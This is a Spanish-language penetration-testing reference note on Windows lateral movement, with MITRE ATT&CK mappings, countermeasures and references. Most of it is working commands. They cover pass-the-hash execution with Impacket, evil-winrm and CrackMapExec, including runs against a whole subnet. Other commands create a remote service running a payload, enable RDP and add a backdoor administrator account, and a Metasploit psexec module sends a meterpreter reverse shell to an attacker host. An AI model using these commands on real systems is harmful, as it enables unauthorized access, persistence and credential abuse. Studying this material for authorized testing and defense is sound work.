# Ejecución Remota en Windows

## Descripción
La ejecución remota en Windows abarca las técnicas que permiten a un atacante ejecutar comandos o código en máquinas Windows remotas dentro de la red, utilizando protocolos y servicios nativos como SMB (PsExec), WinRM (Windows Remote Management), RDP (Remote Desktop Protocol), WMI (Windows Management Instrumentation) y servicios remotos (sc.exe). Estas técnicas son el mecanismo principal de movimiento lateral en entornos Windows y Active Directory, ya que aprovechan la infraestructura legítima de administración remota. Requieren credenciales válidas (contraseñas, hashes o tickets Kerberos) y generalmente privilegios de administrador local en el host destino.

## Clasificación
- **Fase**: Post-Explotación
- **MITRE ATT&CK**: T1021.002 (Remote Services: SMB/Windows Admin Shares); T1021.006 (Remote Services: Windows Remote Management); T1021.001 (Remote Services: Remote Desktop Protocol); T1047 (Windows Management Instrumentation)
- **Plataforma**: Windows
- **Dificultad**: Intermedia

## Herramientas
- **psexec.py** (Impacket) — ejecución remota vía SMB (crea servicio temporal, obtiene SYSTEM)
- **evil-winrm** — shell interactivo vía WinRM (puerto 5985/5986)
- **CrackMapExec** (`cme smb/winrm`) — ejecución remota en múltiples hosts simultáneamente
- **wmiexec.py** (Impacket) — ejecución remota vía WMI (más sigiloso, no crea servicio)
- **sc.exe** — creación y ejecución de servicios en máquinas remotas
- **xfreerdp** / **rdesktop** — clientes RDP para acceso gráfico remoto
- **Metasploit** (`exploit/windows/smb/psexec`) — módulo PsExec con soporte de payloads avanzados

## Comandos / Ejemplos

### PsExec (SMB) — Impacket
```bash
# Ejecución remota con contraseña — obtiene shell SYSTEM
impacket-psexec Administrator:Password123@10.10.10.50

# Ejecución remota con hash NTLM
impacket-psexec -hashes :e3c61a68f1b89ee6c8ba9507378dc88d Administrator@10.10.10.50

# Ejecutar comando específico (sin shell interactivo)
impacket-psexec Administrator:Password123@10.10.10.50 "ipconfig /all"

# SMBExec — alternativa más sigilosa (no sube binario)
impacket-smbexec Administrator:Password123@10.10.10.50

# WMIExec — no crea servicio (más difícil de detectar)
impacket-wmiexec Administrator:Password123@10.10.10.50
impacket-wmiexec -hashes :e3c61a68f1b89ee6c8ba9507378dc88d Administrator@10.10.10.50
```

### WinRM — Evil-WinRM
```bash
# Conexión con contraseña
evil-winrm -i 10.10.10.50 -u Administrator -p Password123

# Conexión con hash NTLM
evil-winrm -i 10.10.10.50 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d

# Funcionalidades integradas dentro de Evil-WinRM
*Evil-WinRM* PS> upload /tmp/winpeas.exe C:\temp\winpeas.exe
*Evil-WinRM* PS> download C:\Users\Administrator\Desktop\flag.txt
*Evil-WinRM* PS> menu  # Ver módulos disponibles
```

### CrackMapExec — ejecución masiva
```bash
# Ejecutar comando en un host vía SMB
crackmapexec smb 10.10.10.50 -u Administrator -p Password123 -x "whoami"

# Ejecutar en toda una subred
crackmapexec smb 10.10.10.0/24 -u Administrator -p Password123 -x "hostname"

# Ejecución vía WinRM
crackmapexec winrm 10.10.10.50 -u Administrator -p Password123 -x "whoami"

# Ejecutar script PowerShell
crackmapexec smb 10.10.10.50 -u Administrator -p Password123 -X "Get-Process"

# Ejecución con hash NTLM
crackmapexec smb 10.10.10.50 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d -x "net user"
```

### SC.EXE — servicio remoto
```powershell
# Crear servicio en máquina remota que ejecute payload
sc \\10.10.10.50 create EvilSvc binPath= "C:\Windows\Temp\payload.exe" start= auto
sc \\10.10.10.50 start EvilSvc

# Limpiar después
sc \\10.10.10.50 stop EvilSvc
sc \\10.10.10.50 delete EvilSvc
```

### RDP — acceso gráfico remoto
```bash
# Conexión RDP con xfreerdp
xfreerdp /u:Administrator /p:Password123 /v:10.10.10.50 /dynamic-resolution

# RDP con hash NTLM (Restricted Admin Mode debe estar habilitado)
xfreerdp /u:Administrator /pth:e3c61a68f1b89ee6c8ba9507378dc88d /v:10.10.10.50

# Habilitar RDP remotamente (si se tiene acceso por otro medio)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall set service type = remotedesktop mode = enable

# Crear usuario y añadir al grupo RDP
net user attacker Password123 /add
net localgroup "Remote Desktop Users" attacker /add
net localgroup administrators attacker /add
```

### WMI — ejecución vía Windows Management Instrumentation
```powershell
# Ejecución remota nativa con wmic
wmic /node:10.10.10.50 /user:Administrator /password:Password123 process call create "cmd.exe /c whoami > C:\temp\output.txt"

# Usando PowerShell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\temp\output.txt" -ComputerName 10.10.10.50 -Credential (Get-Credential)
```

### Metasploit PsExec
```
# Módulo PsExec
use exploit/windows/smb/psexec
set RHOSTS 10.10.10.50
set SMBUser Administrator
set SMBPass Password123
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
exploit
# Resultado: sesión Meterpreter como SYSTEM
```

## Contramedidas
- Deshabilitar servicios de administración remota que no se utilicen (WinRM, RDP) en hosts que no lo requieran
- Implementar firewalls de host (Windows Firewall) para limitar qué IPs pueden conectarse a puertos de administración
- Habilitar Network Level Authentication (NLA) en RDP para requerir autenticación antes de la sesión
- Monitorear eventos de logon remoto: Event ID 4624 con LogonType 3 (Network), 10 (RemoteInteractive), 7 (Unlock)
- Detectar creación de servicios remotos: Event ID 7045 (servicio instalado) correlacionado con conexiones SMB
- Implementar JEA (Just Enough Administration) para WinRM para limitar los comandos que los usuarios pueden ejecutar remotamente
- Restringir el acceso administrativo remoto mediante Group Policy: "Deny access to this computer from the network"
- Usar PAW (Privileged Access Workstations) dedicadas para tareas de administración remota

## Referencias
- MITRE Corporation. (2024). ATT&CK Technique T1021.002: Remote Services: SMB/Windows Admin Shares. https://attack.mitre.org/techniques/T1021/002/
- MITRE Corporation. (2024). ATT&CK Technique T1021.006: Remote Services: Windows Remote Management. https://attack.mitre.org/techniques/T1021/006/
- fortra. (s.f.). *Impacket* [Software]. GitHub. https://github.com/fortra/impacket
- Hackplayers. (s.f.). *Evil-WinRM* [Software]. GitHub. https://github.com/Hackplayers/evil-winrm
- Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
- Allen, L. (2018). *Mastering Kali Linux for Advanced Penetration Testing* (2nd ed.). Packt Publishing.
